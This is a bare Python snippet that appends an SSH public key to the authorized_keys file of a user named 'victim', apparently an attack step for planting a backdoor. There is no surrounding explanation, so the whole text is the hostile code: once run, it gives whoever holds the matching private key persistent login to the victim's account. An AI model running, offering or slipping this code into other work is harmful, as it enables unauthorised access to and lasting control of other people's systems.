with open("/home/victim/.ssh/authorized_keys", "a") as f:
    f.write("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH6CAKUF9Hg6v9rHPko44XC1y2vDuomF8+nnZPJZWCde your_email@example.com\n")